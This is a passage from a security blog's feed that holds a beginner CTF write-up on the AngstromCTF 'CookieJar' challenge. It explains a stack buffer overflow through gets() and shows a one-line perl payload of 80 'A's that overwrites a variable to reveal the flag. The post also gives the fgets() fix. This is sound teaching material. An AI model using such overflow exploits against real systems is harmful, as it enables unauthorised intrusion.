&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Here comes the first Cryptographic challenge! We’ll start with an easy one but nonetheless useful. We will establish the mathematical foundations needed for understanding more complicated codes such as RSA…</summary></entry><entry><title type="html">Introduction to Buffer Overflows: CookieJar - AngstromCTF</title><link href="http://localhost:4000/Introduction-to-Buffer-Overflows-CookieJar-AngstromCTF.html" rel="alternate" type="text/html" title="Introduction to Buffer Overflows: CookieJar - AngstromCTF" /><published>2018-06-05T08:35:00+02:00</published><updated>2018-06-05T08:35:00+02:00</updated><id>http://localhost:4000/Introduction-to-Buffer-Overflows-CookieJar-AngstromCTF</id><content type="html" xml:base="http://localhost:4000/Introduction-to-Buffer-Overflows-CookieJar-AngstromCTF.html">&lt;p&gt;For my first article on this blog, I’ll present you my write-up of “CookieJar” from the AngstromCTF. This challenge was accessible and very straight-forward, which constitutes the prefect opportunity to introduce &lt;strong&gt;Buffer Overflows&lt;/strong&gt;…
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#pre-requisites&quot; id=&quot;markdown-toc-pre-requisites&quot;&gt;Pre-requisites&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#challenge-description&quot; id=&quot;markdown-toc-challenge-description&quot;&gt;Challenge description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#program-analysis&quot; id=&quot;markdown-toc-program-analysis&quot;&gt;Program analysis&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#lets-run-it-&quot; id=&quot;markdown-toc-lets-run-it-&quot;&gt;Let’s run it !&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#source-code-dissection&quot; id=&quot;markdown-toc-source-code-dissection&quot;&gt;Source code dissection&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vulnerabilty-explanation&quot; id=&quot;markdown-toc-vulnerabilty-explanation&quot;&gt;Vulnerabilty explanation&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#what-is-a-buffer-overflow&quot; id=&quot;markdown-toc-what-is-a-buffer-overflow&quot;&gt;What is a buffer overflow?&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#what-does-it-involve&quot; id=&quot;markdown-toc-what-does-it-involve&quot;&gt;What does it involve?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#detection-of-the-vulnerable-code&quot; id=&quot;markdown-toc-detection-of-the-vulnerable-code&quot;&gt;Detection of the vulnerable code&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#exploit&quot; id=&quot;markdown-toc-exploit&quot;&gt;Exploit&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;pre-requisites&quot;&gt;Pre-requisites&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;A very basic understanding of &lt;strong&gt;x86 or x64 architectures&lt;/strong&gt; will help you to grasp the concept of buffer overflow.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-06-05/challenge.png&quot; alt=&quot;challenge statement&quot; title=&quot;Statement&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have &lt;a href=&quot;/assets/2018-06-05/cookiePublic64&quot;&gt;a binary&lt;/a&gt; and the corresponding &lt;a href=&quot;/assets/2018-06-05/cookiePublic.c&quot;&gt;source code&lt;/a&gt; given for this challenge. The objective is to find a way to exploit this binary locally and to re-use the same exploit on the remote server in order to get the flag.&lt;/p&gt;

&lt;p&gt;The first thing we should do in this case is to analyze the program and its source code.&lt;/p&gt;

&lt;h2 id=&quot;program-analysis&quot;&gt;Program analysis&lt;/h2&gt;
&lt;h3 id=&quot;lets-run-it-&quot;&gt;Let’s run it !&lt;/h3&gt;

&lt;p&gt;Here is a standard execution:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@csb:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the cookie jar:
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 100
Sorry, you only had 0 cookies, try again!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The program asks for an number of cookies in the jar but no matter what we submit, it seems that we are stuck with 0 cookies.&lt;/p&gt;

&lt;p&gt;Alright, now let’s dive into the code!&lt;/p&gt;

&lt;h3 id=&quot;source-code-dissection&quot;&gt;Source code dissection&lt;/h3&gt;

&lt;p&gt;The code is pretty simple so the vulnerability should jump out.&lt;/p&gt;

&lt;p&gt;Don’t pay attention to the first part of the main function, it only sets the execution rights of the program.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;setresgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here are the noticeable parts:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A variable named &lt;strong&gt;numCookies&lt;/strong&gt; is declared and initialized with 0.
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;A buffer is declared with a size of 64 characters for storing the user input.
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;A simple check is done on &lt;strong&gt;numCookies&lt;/strong&gt; and displays the &lt;strong&gt;flag&lt;/strong&gt; if numCookies&amp;gt;=100.
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Congrats, you have %d cookies!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Here's your flag: %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sorry, you only had %d cookies, try again!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All of this seems pretty legit but there’s no way to increment this variable… We’re probably missing something.&lt;/p&gt;

&lt;h2 id=&quot;vulnerabilty-explanation&quot;&gt;Vulnerabilty explanation&lt;/h2&gt;

&lt;p&gt;I’ll give you a hint:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gets(buffer);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this moment, you must be like “Yeah… OK… tell me more” and it’s normal if you’ve never encountered this kind of vulnerability.&lt;/p&gt;

&lt;p&gt;However, this is probably one of the most common exploit and it’s called &lt;strong&gt;buffer overflow&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;what-is-a-buffer-overflow&quot;&gt;What is a buffer overflow?&lt;/h3&gt;

&lt;p&gt;When a variable is declared, space is allocated on the stack according to the size of our variable.&lt;/p&gt;

&lt;p&gt;Let’s take the example of the buffer from the challenge:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After this instruction, &lt;strong&gt;64 bytes are allocated on the stack&lt;/strong&gt; in order to store the value contained in the buffer (A char is coded on a single byte in C).&lt;/p&gt;

&lt;p&gt;In compiled languages such as C, the memory is allocated at the compilation time and this process is sequential. It means that the next variable found in the code will be located above the previous one on the stack.&lt;/p&gt;

&lt;p&gt;Also keep in mind that &lt;strong&gt;the highest addresses are located at the bottom of the stack&lt;/strong&gt; in our architecture.&lt;/p&gt;

&lt;p&gt;In the source code of the challenge, the very interesting variable &lt;strong&gt;numCookies&lt;/strong&gt; is declared just before the buffer. In other words, &lt;strong&gt;the buffer will be stored right above numCookies on the stack.&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s represent the hypotetical state of the stack:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2018-06-05/stack-draw.png&quot; alt=&quot;State of the stack&quot; title=&quot;State of the stack&quot; width=&quot;70%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At this point, you should be able to start guessing the impact of such vulnerability.&lt;/p&gt;

&lt;p&gt;Indeed, we have 64 bytes of memory allocated to our buffer, but what happens if we try to write more than 64 bytes?&lt;/p&gt;

&lt;p&gt;Any idea? … It simply &lt;strong&gt;overwrites the values&lt;/strong&gt; stored in variables that are located below the buffer on the stack.&lt;/p&gt;

&lt;h3 id=&quot;what-does-it-involve&quot;&gt;What does it involve?&lt;/h3&gt;

&lt;p&gt;Overwriting variables in the stack can result in random effects if the attacker doesn’t control the impacted variables.&lt;/p&gt;

&lt;p&gt;However, if the stack is perfectly controlled, the attack can occur a &lt;strong&gt;program crash&lt;/strong&gt; or &lt;strong&gt;provide full-rights on the machine&lt;/strong&gt; to the attacker by executing a shellcode.&lt;/p&gt;

&lt;p&gt;Buffer overflows only act as &lt;strong&gt;vectors of attack&lt;/strong&gt;, they represent a way of gaining access or executing code on the machine but they often don’t symbolize the attack in its entirety. Once the access is granted on the machine, the funny things can start…&lt;/p&gt;

&lt;p&gt;We will see more advanced exploits based on buffer overflows in future articles, don’t worry about that :wink:.&lt;/p&gt;

&lt;h2 id=&quot;detection-of-the-vulnerable-code&quot;&gt;Detection of the vulnerable code&lt;/h2&gt;

&lt;p&gt;Alright, this vulnerability seems really powerful but is there a way to prevent it? How do we identify the vulnerable piece of code?&lt;/p&gt;

&lt;p&gt;In our case, the vulnerability is simple to exploit because of the lack of user input control. The following part of the code is vulnerable because the developper didn’t verify the length of the user input.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A simple &lt;code class=&quot;highlighter-rouge&quot;&gt;man gets&lt;/code&gt; warns us about the usage of this function and its level of risk.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read,  and  because gets()  will continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to break computer security. Use fgets() instead.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here is what a careful developer should have written:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;OR&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If you were to retain one thing from this article, as a developer, it would be this: &lt;strong&gt;NEVER TRUST USER INPUT&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;

&lt;p&gt;Now that we have identified the &lt;strong&gt;vector of attack&lt;/strong&gt; and the piece of &lt;strong&gt;vulnerable code&lt;/strong&gt;, we can write the exploit!&lt;/p&gt;

&lt;p&gt;Our objective is to bypass this “if statement”: &lt;code class=&quot;highlighter-rouge&quot;&gt;if (numCookies &amp;gt;= 100){&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;In order to do that, we have to set &lt;strong&gt;numCookies&lt;/strong&gt; to &lt;strong&gt;100 or greater&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Let’s get our hands dirty!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;You get it, we have to submit more than 64 characters to the program.&lt;/p&gt;

&lt;p&gt;There are 2 methods:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;You can enter the 64 characters manually when the program asks for a number of cookies.&lt;/li&gt;
  &lt;li&gt;Or you can &lt;strong&gt;use a scripting language&lt;/strong&gt; such as python or perl to do it for you (Highly recommended).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To make sure the value of &lt;strong&gt;numCookies&lt;/strong&gt; is overwritten, we can write 80 characters thanks to the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@csb:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;x80'&lt;/span&gt; | ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the cookie jar:
Congrats, you have 1094795585 cookies!
Here&lt;span class=&quot;s1&quot;&gt;'s your flag: ----------REDACTED----------
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s working! Now, we just have to execute our exploit on the remote server in order to get the flag :blush:.&lt;/p&gt;

&lt;p&gt;I hope you now have a clearer idea of what is a buffer overflow. Do not hesitate to leave a comment or to contact me if you have any question or suggestion.&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">For my first article on this blog, I’ll present you my write-up of “CookieJar” from the AngstromCTF. This challenge was accessible and very straight-forward, which constitutes the prefect opportunity to introduce Buffer Overflows…</summary></entry></feed>